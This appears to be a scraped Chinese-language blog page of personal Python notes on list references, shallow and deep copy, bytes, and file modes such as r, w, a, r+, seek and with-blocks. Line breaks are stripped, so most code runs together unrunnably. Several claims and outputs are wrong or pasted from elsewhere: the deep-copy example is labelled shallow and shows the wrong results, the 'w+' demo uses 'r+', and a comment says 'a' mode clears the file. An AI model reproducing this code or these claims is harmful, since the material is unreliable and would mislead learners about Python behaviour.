#示例5：列表嵌套：可变序列修改，所有指向它的变量的值都会改变（二）a = [1,2,3]  		#将该列表的内存地址给了ab = [44,55,a]         #此处b的第三个元素指向的并不是变量a，而是序列[1,2,3]，所以[1,2,3]改变，b也会改变a.append(4)   		 #此处修改的是a指向的序列[1,2,3]，所以所有指向该序列的变量都会改变print(a,b)  #结果为：[1, 2, 3, 4]   	[44, 55, [1, 2, 3, 4]]#示例6：列表嵌套：可变序列修改，所有指向它的变量的值都会改变（三）a = [1,2,3]  		#将该列表的内存地址给了ab = [44,55,a]       #此处b的第三个元素指向的并不是变量a，而是序列[1,2,3]，所以[1,2,3]改变，b也会改变b[2][0] = 100    	#此处修改的是序列[1,2,3]，所以所有指向它的变量都会被修改，这里包括a和bprint(a,b)       #结果为：[100, 2, 3]			 [44, 55, [100, 2, 3]]#示例6：列表嵌套：可变序列修改，所有指向它的变量的值都会改变（四）a = [1,2,3] 		 #将该列表的内存地址给了ab = [44,55]c = [5,6,a,b,a]  	#此处的a指向的是[1,2,3],b指向的是[4,5]c[2].append(666)   	#此处对序列[1,2,3]进行了修改，所以所有指向该序列的变量的值都会被修改print(a,b,c)#结果为：[1, 2, 3, 666] 	[44, 55]		 [5, 6, [1, 2, 3, 666], [44, 55], [1, 2, 3, 666]]#示例8：列表嵌套：变量被重新赋值（一）a = [1,2,3] 		 #将该列表的内存地址给了ab = [44,55,a]        #此处b的第三个元素指向的并不是变量a，而是序列[1,2,3]，所以[1,2,3]改变，b也会改变a = 10    			#此处并不是修改，而是将a进行重新赋值，此时a指向了10，但是b并没有影响print(a,b)           #结果为：10 				[44, 55, [1, 2, 3]]#示例9：列表嵌套：变量被重新赋值（二）a = [1,2,3] 		 #将该列表的内存地址给了ab = [44,55,a]       #此处b的第三个元素指向的并不是变量a，而是序列[1,2,3]，所以[1,2,3]改变，b也会改变b[2] = 50  	 #相当于将b[2]重新赋值，将b[2原先指向的[1,2,3]改为了10，对所有指向序列[1,2,3]的变量没影响print(a,b)​```     </span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>练习题：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例1：v1 = &#123;&#x27;k1&#x27;:&#x27;v1&#x27;,&#x27;k2&#x27;:[1,2,3]&#125;v2 = v1v1[&#x27;k1&#x27;] = &#x27;wupeiqi&#x27;print(v2)        #结果为：&#123;&#x27;k1&#x27;:&#x27;wupeiqi&#x27;,&#x27;k2&#x27;:[1,2,3]&#125;#示例2：v1 = &#x27;人生苦短，我用Python&#x27;v2 = [1,2,3,4,v1]v1 = &quot;人生苦短，用毛线Python&quot;print(v2)  #结果为：[1, 2, 3, 4, &#x27;人生苦短，我用Python&#x27;]#示例3：info = [1,2,3]userinfo = &#123;&#x27;account&#x27;:info, &#x27;num&#x27;:info, &#x27;money&#x27;:info&#125;info.append(9)print(userinfo)   #结果为：&#123;&#x27;account&#x27;: [1, 2, 3, 9], &#x27;num&#x27;: [1, 2, 3, 9], &#x27;money&#x27;: [1, 2, 3, 9]&#125;info = &quot;题怎么这么多&quot;print(info,userinfo) #结果为：题怎么这么多 &#123;&#x27;account&#x27;: [1, 2, 3, 9], &#x27;num&#x27;: [1, 2, 3, 9], &#x27;money&#x27;: [1, 2, 3, 9]&#125;#示例4：info = [1,2,3]userinfo = [info,info]info[0] = &#x27;不仅多，还特么难呢&#x27;print(info)   #结果为：[&#x27;不仅多，还特么难呢&#x27;, 2, 3]print(userinfo)   #结果为：[[&#x27;不仅多，还特么难呢&#x27;, 2, 3], [&#x27;不仅多，还特么难呢&#x27;, 2, 3]]#示例5：info = [1,2,3]userinfo = [info,info]userinfo[1][0] = &#x27;闭嘴&#x27;print(info)  		 #结果为：[&#x27;闭嘴&#x27;, 2, 3]print(userinfo)      #结果为：[[&#x27;闭嘴&#x27;, 2, 3], [&#x27;闭嘴&#x27;, 2, 3]]#示例6：info = [1, 2, 3]user_list = []for item in range(2):    user_list.append(info)info[1] = &quot;是谁说Python好学的？&quot;print(user_list)       #[[1, &#x27;是谁说Python好学的？&#x27;, 3], [1, &#x27;是谁说Python好学的？&#x27;, 3]]#示例6：data = &#123;&#125;for i in range(2):    data[&#x27;user&#x27;] = iprint(data)  #结果为：&#123;&#x27;user&#x27;: 1&#125;#示例7：data_list = []data = &#123;&#125;for i in range(2):    data[&#x27;user&#x27;] = i    data_list.append(data)print(data)    #结果为：&#123;&#x27;user&#x27;: 1&#125;print(data_list)   #结果为：[&#123;&#x27;user&#x27;: 1&#125;, &#123;&#x27;user&#x27;: 1&#125;]#示例8：data_list = []for i in range(2):    data = &#123;&#125;    data[&#x27;user&#x27;] = i    data_list.append(data)print(data_list)    #结果为：[&#123;&#x27;user&#x27;: 0&#125;, &#123;&#x27;user&#x27;: 1&#125;]</span></span><br></pre></td></tr></table></figure>



<p>疑难点1：列表中嵌套的变量指向的到底是什么？</p>
<ul>
<li>```python<br>a = [1,2]b = [3,4,a]  #此处的b[2]元素指向的并不是变量a，指向的是列表[1,2]，所以如果a重新赋值，b不会改变；只有序列[1,2]被修改，b才会改变<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">疑难点2：只要是给变量赋值，就是开辟了一个内存用来储存数据，那么如果两个变量的赋值都是10，为啥它们的内存地址一样？</span><br><span class="line"></span><br><span class="line">- 因为python有缓存机制，都有个缓存池，目的是节省空间，如果在某个范围内，那么久不再新开辟内存，而是采用共用的方法，使用同一个内存</span><br><span class="line"></span><br><span class="line">- int缓存范围：-5   ~  256</span><br><span class="line"></span><br><span class="line">  示例：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  a = 3b = 3print(id(a),id(b))#结果为：8791065478880 			8791065478880</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-14-深浅拷贝"><a href="#3-14-深浅拷贝" class="headerlink" title="3.14 深浅拷贝"></a>3.14 深浅拷贝</h3><p>含义：</p>
<ul>
<li><p>浅拷贝：a = [11,22]，b = [1,2,a]，c是通过拷贝b得来的，所以c也是 [1,2,a]</p>
<p>特点：只拷贝第一层，也就是只拷贝1,2和a所指向的序列的地址，注意这里是地址，所以b里的a和c里的a所指向的都是同一个地址，所以如果a进行了修改，那么b的值也会同步修改，c也会同步修改，因为是浅拷贝，将嵌套的序列的地址拷贝过来了</p>
</li>
<li><p>深拷贝：完全复制，a发生变化，对c没影响，在此例子中，会新建2个内存，第一个内存用来存放第一层数据，这里的b的第一层数据的a所指向的地址不再是[11,22]，而是指向了此次新建的第二个内存，而该第二个内存里储存的数据就是[11,22]，所以深拷贝就是完全和原数据b独立，互不影响；如果在发现不可变类型数据（元组除外），那么就不会新建内存，而是直接引用该不可变类型数据的地址，相当于直接调用</p>
</li>
</ul>
<p>总结：</p>
<ul>
<li>浅拷贝：拷贝体和源数据可以互相影响（在修改可变类型的数据时）</li>
<li>深拷贝：拷贝体和源数据完全独立，互不影响</li>
</ul>
<p>适合的数据类型：</p>
<ul>
<li>浅拷贝：不可变数据类型：bool，int，字符串、元组</li>
<li>深拷贝：字典、列表、集合</li>
</ul>
<p>易错点：</p>
<ul>
<li><p>深浅拷贝出来的结果是完全一样的，比如打印出来的结果都是一样</p>
</li>
<li><p>区别就是浅拷贝可以影响源数据，源数据也可以影响浅拷贝</p>
<ul>
<li>前提就是修改他们的可变类型，修改源数据和拷贝数据都会影响另一方</li>
</ul>
</li>
<li><p>深拷贝则是完全拷贝，不管源数据或者拷贝体的任何类型进行了修改，都不会影响到对方</p>
</li>
</ul>
<p>疑难点：</p>
<ul>
<li><p>既然无论是浅拷贝还是深拷贝，都会新建一块内存，为啥我拷贝字符串或者数值时，发现源数据和拷贝体的内存地址一样？</p>
<p>因为python的小数据池，缓存机制，如果换成列表、字典等就不会有问题了</p>
</li>
</ul>
<p>语法：</p>
<ul>
<li>导入模块：import copy</li>
<li>浅拷贝：b = copy.copy(a)    #复制a，将其赋值给变量b</li>
<li>深拷贝：b = copy.deepcopy(a)    #复制a，将其赋值给变量b</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#小数据池：没有新建新的内存#示例一：拷贝元组：import  copya = (1,2)b = copy.copy(a)   #浅拷贝c = copy.deepcopy(a)  print(id(a),id(b),id(c))   #3个地址一样，都是指向的元组(1,2)#示例二：拷贝数值import  copya = 1000b = copy.copy(a)   #浅拷贝c = copy.deepcopy(a) print(id(a),id(b),id(c))   #3个地址一样，都是指向的元组(1,2)#无嵌套：深浅拷贝结果一样import  copya = [1,2]b = copy.copy(a)   #浅拷贝c = copy.deepcopy(a)   #深拷贝print(id(a),id(b),id(c))   #3个地址都不同print(a,c,c)   #结果为：[1, 2] [1, 2] [1, 2]#有嵌套浅拷贝：源数据和拷贝体互相影响：import  copya = [1,2,(    5,6,&#123;&#x27;user&#x27;:[3,2] &#125;   )       ]b = copy.copy(a)   #浅拷贝#浅拷贝每个元素指向的地址都一样，所以拷贝体、源数据都可以影响对方print(id(a[0]),id(b[0]))   #内存地址：8791025370784 8791025370784 ，相同print(id(a[2]),id(b[2]))   #内存地址：40931200 40931200 ，相同print(id(a[2][2]),id(b[2][2]))   #内存地址：35280192 35280192 ，相同a.append(66)print(a,b)  #结果为：[1, 2, (5, 6, &#123;&#x27;user&#x27;: [3, 2]&#125;), 66] [1, 2, (5, 6, &#123;&#x27;user&#x27;: [3, 2]&#125;)]b[2][2][&#x27;user&#x27;] = &#x27;张三&#x27;print(a,b)    #结果为：[1, 2, (5, 6, &#123;&#x27;user&#x27;: &#x27;张三&#x27;&#125;), 66] [1, 2, (5, 6, &#123;&#x27;user&#x27;: &#x27;张三&#x27;&#125;)]#有嵌套浅拷贝：源数据和拷贝体两者独立：import  copya = [1,2,(5,6,&#123;&#x27;user&#x27;:[3,2] &#125;,[&#x27;dasfadsf&#x27;,4],3)       ]b = copy.deepcopy(a)   #浅拷贝#浅拷贝每个元素指向的地址都一样，所以拷贝体、源数据都可以影响对方print(id(a[0]),id(b[0]))   #内存地址：8791020979872 8791020979872  相同，因为这是不可变类型print(id(a[2]),id(b[2]))   #内存地址：38180400 45431040        不相同print(id(a[2][2]),id(b[2][2]))   #内存地址：38819136 41179008   不相同print(id(a[2][4]),id(b[2][4]))    #内存地址：8791020979936 8791020979936  3为不可变类型，所以直接此处直接引用a.append(66)print(a,b)  #结果为：[1, 2, (5, 6, &#123;&#x27;user&#x27;: [3, 2]&#125;), 66] [1, 2, (5, 6, &#123;&#x27;user&#x27;: [3, 2]&#125;)]b[2][3].append(&#x27;张三&#x27;)print(a,b)    #结果为：[1, 2, (5, 6, &#123;&#x27;user&#x27;: &#x27;张三&#x27;&#125;), 66] [1, 2, (5, 6, &#123;&#x27;user&#x27;: &#x27;张三&#x27;&#125;)]</span></span><br></pre></td></tr></table></figure>









<h3 id="3-15-bytes类型"><a href="#3-15-bytes类型" class="headerlink" title="3.15 bytes类型"></a>3.15 bytes类型</h3><p>别名：字节类型</p>
<p>标志： b</p>
<p>本质：就是被压缩后的二进制</p>
<p>字符串类型和字节类型的关系：</p>
<ul>
<li>字符串类型默认采用unicode编码，一般在内存中使用</li>
<li>字节类型就是将字符串类型的数据进行编码，采用其他方式编码，比如utf-8、gbk等编码，编码后的结果就是字节型</li>
</ul>
<p>字符串类型和字节类型的总结：</p>
<ul>
<li>以后提及字符串就是代表unicode编码</li>
<li>以后提及字节类型，就是代表是utf-8、gbk等其他编码</li>
</ul>
<h3 id="3-16-datetime类型"><a href="#3-16-datetime类型" class="headerlink" title="3.16 datetime类型"></a>3.16 datetime类型</h3><h2 id="第四章-文件操作"><a href="#第四章-文件操作" class="headerlink" title="第四章 文件操作"></a>第四章 文件操作</h2><p>文件操作的本质：</p>
<ul>
<li><p>打开文件</p>
</li>
<li><p>计算机根据文件的编码进行逆转，换算成unicode编码</p>
</li>
<li><p>执行操作</p>
<ul>
<li>读取：从计算机内存中读取文件的内容(读取的时候会自动将unicode转换成文件原先的编码)</li>
<li>写入</li>
</ul>
</li>
<li><p>保存文件：就是关闭文件</p>
</li>
</ul>
<h3 id="4-1-文件基本操作"><a href="#4-1-文件基本操作" class="headerlink" title="4.1 文件基本操作"></a>4.1 文件基本操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">obj = <span class="built_in">open</span>(<span class="string">&#x27;路径&#x27;</span>,mode=<span class="string">&#x27;模式&#x27;</span>,encoding=<span class="string">&#x27;编码&#x27;</span>)   <span class="comment">#将文件读取到内存，根据当前文件编码(utf-8)进行逆转，将其转换为unicodeobj.write()      #写入：适用于w和a模式obj.read()     #读取文件，可以赋值给一个变量直接打印,直接从光标开始往后读取obj.close()   #关闭文件，如果不关闭，就相当于文件没有保存，数据都在内存，所以写入会无效</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2-打开模式"><a href="#4-2-打开模式" class="headerlink" title="4.2  打开模式"></a>4.2  打开模式</h3><ul>
<li><p>r / w / a：</p>
<p>r:只读模式：如果当前文件不存在，则会报错</p>
<ul>
<li><p>特点：只能读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#将文件加载到内存,并将内存中的数据以unicode给变量message_read = message.read()  #读取内存中的数据，以文件的原始编码utf-8读取message.close()print(message_read)   #打印读取的数据</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>w：写入模式：一旦填写了该语句，会立刻清空当前文件（不论下面执不执行写入语句write）；如果当前文件不存在，则会在该脚本所在的目录自动创建一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#将文件加载到内存,并将内存中的数据以unicode给变量print(message.read())   #打印读取的数据:das;fljdaslfkmessage.close()message = open(&#x27;测试.txt&#x27;,mode=&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)   #该语句一执行，就清空了当前文本message.write(&#x27;狗屎！&#x27;) #此时文件的内容变味了：狗屎！message.close</span></span><br></pre></td></tr></table></figure>

<p>a：追加模式：不清空数据，直接在文本最后面添加;写入语句也是用write()；如果当前文件不存在，则会在该脚本所在的目录自动创建一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#提前将测试.txt的内容设置为：das;fljdaslfkmessage = open(&#x27;测试.txt&#x27;,mode=&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量print(message.read())   #打印读取的数据:das;fljdaslfkmessage.close()message = open(&#x27;测试.txt&#x27;,mode=&#x27;a&#x27;,encoding=&#x27;utf-8&#x27;)   #该语句一执行，就清空了当前文本message.write(&#x27;狗屎！&#x27;) #写入语句也是write,此时结果为：das;fljdaslfk狗屎！message.close</span></span><br></pre></td></tr></table></figure></li>
<li><p>r+ / w+ / a+</p>
<p>r+：读写模式</p>
<ul>
<li>先读后写再读：这里的写就类似于追加，直接在文本最后写入；因为读取会将光标调到最后，所以接下来的写入就相当于追加，因为写入，所以光标始终在最后，所以读取到的就是空白</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#提前将测试.txt的内容设置为：das;fljdaslfkmessage = open(&#x27;测试.txt&#x27;,mode=&#x27;r+&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量print(message.read())   #打印读取的数据:das;fljdaslfkmessage.write(&#x27;狗屎！&#x27;) #写入语句也是write,此时结果为：das;fljdaslfk狗屎！print(message.read())   #空白message.close()</span></span><br></pre></td></tr></table></figure>



<p>w+:写读模式（清空）：先写后读取，结果为空，因为光标跑到最后去了</p>
<ul>
<li>因为光标默认是从0开始，所以一旦开始写，如果文本里有数据，那么数据就会被部分覆盖（写入多少字节，就覆盖几个字节（字节换算根据编码来））</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#提前将测试.txt的内容设置为：das;fljdaslfkmessage = open(&#x27;测试.txt&#x27;,mode=&#x27;r+&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量message.write(&#x27;狗屎！&#x27;) #此时光标在0的位置，所以写入会覆盖文本从光标往后的3个字符相当于9个字节（狗屎！）message.close()        #此时文本内容变成了：狗屎！slfk</span></span><br></pre></td></tr></table></figure>

<p>a+:写读模式(不清空)：光标自动跑到最后</p>
<ul>
<li>特性：只要执行写入操作，光标自动跑到最后，所以该模式写入永远都是追加</li>
</ul>
</li>
<li><p>rb / wb / ab：</p>
<p>rb:读取的直接是二进制，open里就没有encoding</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f :   <span class="comment">#此时这里没有encoding参数，并且模式为rb就是读取二进制，读取的将是二进制    data = f.read()        print(data)  #结果为：b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br></pre></td></tr></table></figure>

<p>wb:直接写入二进制，write接收的参数是二进制</p>
<ul>
<li>先将数据按照需要的编码编码成二进制，然后提交给write</li>
<li>适用范围：爬虫，我们爬取下来的数据都是无法直接利用的，需要将其按照它的编码方式进行编码，编码成二进制，然后写入我们的磁盘</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#没有指定encoding，默认写入二进制，所以write接收参数为二进制with open(&#x27;测试.txt&#x27;,mode=&#x27;wb&#x27;) as f :    f.write(&#x27;你好&#x27;)   #报错：TypeError: a bytes-like object is required, not &#x27;str&#x27;，因为没有指定编码encoding，所以默认是写入二进制        #将数据转换为二进制，然后提交给write即可    with open(&#x27;测试.txt&#x27;,mode=&#x27;wb&#x27;) as f :    data = &#x27;测试&#x27;.encode(&#x27;utf-8&#x27;)   #先将&#x27;测试&#x27;按照utf-8的编码进行编码，编码成二进制    f.write(data)   #结果为：测试</span></span><br></pre></td></tr></table></figure>

<p>ab：同理，接收的也是二进制</p>
</li>
<li><p>r+b / w+b / a+b </p>
</li>
</ul>
<p>w模式和a模式的区别：</p>
<ul>
<li>w模式会清空文本，a模式不会清空，是直接追加；只要模式一选定，就会自动清空，不管后面有没有执行操作语句</li>
<li>使用的写入函数都是write()</li>
<li>w模式主要是用来新建文件用的</li>
<li>a模式主要是用来新增内容用的</li>
</ul>
<h3 id="4-3-操作"><a href="#4-3-操作" class="headerlink" title="4.3 操作"></a>4.3 操作</h3><p>移动光标：seek()</p>
<ul>
<li><p>接收参数：字节</p>
</li>
<li><p>移动的计量单位：字节，将内容根据字节拆分，如果光标移动到一个字或者字符的内部了（比如汉字是3个字节，如果向右移动了1个字节，那么光标就在汉字内部），如果在执行写入，会将该汉字拆分成了乱码，而乱码正中间就是我们写入的字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#提前将测试.txt的内容设置为：狗屎！message = open(&#x27;测试.txt&#x27;,mode=&#x27;r+&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量message.seek(2)   #接收的单位是字节message.write(&#x27;6&#x27;) #此时光标在2的位置，写入会从光标起始往后写message.close()        #此时文本内容变成了：�6屎！</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>获取当前光标所在位置：返回值是字节</p>
<ul>
<li><p>tell()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f :    <span class="built_in">print</span>(f.tell())    <span class="comment">#结果为：0    f.seek(10)         #移动光标到第10个字节的位置    print(f.tell())    #结果为：10</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>读取所有内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;提前将测试.txt的内容设置为：发的说法；看得舒服了的吉安市弗兰克圣诞节按付款了大师傅来陪我了&#x27;&#x27;&#x27;</span>message = <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#将文件加载到内存,并将内存中的数据以unicode给变量message1 = message.read()message.close()print(message1)</span></span><br></pre></td></tr></table></figure>



<p>读取所有内容，并按照每一行将其其存储到列表：readlines()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;提前将测试.txt的内容设置为：发的说法；看得舒服了的吉安市弗兰克圣诞节按付款了大师傅来陪我了&#x27;&#x27;&#x27;</span>message = <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#将文件加载到内存,并将内存中的数据以unicode给变量message1 = message.readlines()message.close()print(message1)#结果为：[&#x27;发的说法\n&#x27;, &#x27;；看得舒服了\n&#x27;, &#x27;的吉安市弗兰克\n&#x27;, &#x27;圣诞节按付款了\n&#x27;, &#x27;大师傅来陪我\n&#x27;, &#x27;了&#x27;]</span></span><br></pre></td></tr></table></figure>



<p>读取光标后的几个字符：</p>
<ul>
<li><p>读取的起始位置：光标处</p>
</li>
<li><p>接收参数：字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#将文件加载到内存,并将内存中的数据以unicode给变量message1 = message.read(3)    #接收参数为字符，并不是字节message.close()print(message1)   #结果一：这时一</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>读取大文件：</p>
<ul>
<li><p>意义：当一个数据很大，比如16g，我们一下子全部读取，可能电脑都会卡死，死机</p>
</li>
<li><p>特点：千万不要用read函数，因为用这个函数就相当于全部读取了</p>
</li>
<li><p>方法：利用for循环和read()来实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="keyword">for</span>  i <span class="keyword">in</span> test     <span class="comment">#直接不读取，直接从内存中打印    print(i)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>强制将内存中的数据刷到硬盘（类似于关闭文件）</p>
<ul>
<li>flush()</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)f.write(<span class="string">&#x27;大家附近的水立方简单来说加法里的数据莲富大厦客服&#x27;</span>)f.flush()   <span class="comment">#强制将内存中的数据刷入到磁盘中</span></span><br></pre></td></tr></table></figure>



<h3 id="4-4-关闭文件"><a href="#4-4-关闭文件" class="headerlink" title="4.4 关闭文件"></a>4.4 关闭文件</h3><p>手动执行关闭文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#意义：将内存中的数据保存到硬盘上，如果没有该语句，那么数据不会保存a.close()</span></span><br></pre></td></tr></table></figure>



<p>自动执行关闭文件：推荐</p>
<ul>
<li><p>要素：</p>
<ul>
<li>with   ,as   变量     缩进</li>
</ul>
</li>
<li><p>特点：一旦出了缩进，文件就自动关闭</p>
</li>
<li><p>多个语句，直接用逗号连接，最后结尾用冒号,并且只需要一个with即可</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f :   <span class="comment">#打开文件赋值给变量f</span></span><br><span class="line">    f.write(<span class="string">&#x27;大家附近的水立方简单来说加法里的数据莲富大厦客服&#x27;</span>)    <span class="comment">#必须在with的子代码块中才会自动关闭文件</span></span><br><span class="line"><span class="comment">#等价于下面的句子</span></span><br><span class="line">f =  <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#单个语句</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f  :     <span class="comment">#打开文件，然后赋值给变量f,冒号一定不能少</span></span><br><span class="line">    f.write(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#多个语句</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f ,<span class="built_in">open</span>(<span class="string">&#x27;good.txt&#x27;</span>, mode=<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f2 :</span><br><span class="line">    f.write(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    f2.write(<span class="string">&#x27;777&#x27;</span>)</span><br><span class="line">	f.close()</span><br><span class="line">    f2.close()</span><br></pre></td></tr></table></figure>











<h3 id="4-5-文件内容的修改"><a href="#4-5-文件内容的修改" class="headerlink" title="4.5  文件内容的修改"></a>4.5  文件内容的修改</h3><p>前提：文件内容无法直接修改</p>
<p>原因：因为文件存储的本质是将二进制写入到磁盘，所以如果我们需要修改，就需要插入或删除对应位置的二进制，但是二进制不支持插入自动后移，如果我们插入数据，后面的数据必须要自动往后移动对应字节所占的位置，但是二进制不支持这一点</p>
<p>折中办法：在内存中修改，然后使用w模式(清空原有数据)，然后将内存中的数据写进去</p>
<p>大文件的修改：</p>
<ul>
<li><p>疑难点：可能文件50G，我们如果直接读取到内存，内存会爆</p>
</li>
<li><p>解决方法：打开两个文件，一行一行读取，读取一行写入一行（写到另外一个文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;测试.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f ,<span class="built_in">open</span>(<span class="string">&#x27;测试2.txt&#x27;</span>,mode=<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1:    <span class="keyword">for</span> data <span class="keyword">in</span> f :        f1.write(data)   <span class="comment">#读取一行，写入一行    f1.seek(0)            #将光标调到0，否则打印为空    data2 = f1.read()    #读取f1的所有数据    print(data2)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-6-文件和字典等序列的应用"><a href="#4-6-文件和字典等序列的应用" class="headerlink" title="4.6 文件和字典等序列的应用"></a>4.6 文件和字典等序列的应用</h3><p>将列表里的字典的内容添加到文本里</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;#将字典内容添加到文本里张三 28李四 25王麻子 20&#x27;&#x27;&#x27;</span><span class="comment">#方法一：message = open(&#x27;测试.txt&#x27;,mode=&#x27;a+&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量message_student = [&#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28&#125;,&#123;&#x27;name&#x27;:&#x27;李四&#x27;,&#x27;age&#x27;:25&#125; ,&#123;&#x27;name&#x27;:&#x27;王麻子&#x27;,&#x27;age&#x27;:20&#125;]for i in range(0,len(message_student)):    for v in message_student[i].values() :        message1 = message.write(str(v)+&#x27; &#x27;)    message.write(&#x27;\n&#x27;)message.seek(0)message1 = message.read()message.close()print(message1)   #方法二：&#x27;&#x27;&#x27;#将字典内容添加到文本里张三 28李四 25王麻子 20&#x27;&#x27;&#x27;message = open(&#x27;测试.txt&#x27;,mode=&#x27;a+&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量message_student = [&#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28&#125;,&#123;&#x27;name&#x27;:&#x27;李四&#x27;,&#x27;age&#x27;:25&#125; ,&#123;&#x27;name&#x27;:&#x27;王麻子&#x27;,&#x27;age&#x27;:20&#125;]for i in message_student:    for k,v in i.items():        print(v)        message.write(str(v)+&#x27; &#x27;)    message.write(&#x27;\n&#x27;)print(message.read())message.close()</span></span><br></pre></td></tr></table></figure>



<p>将文本内容写到列表里的字典里</p>
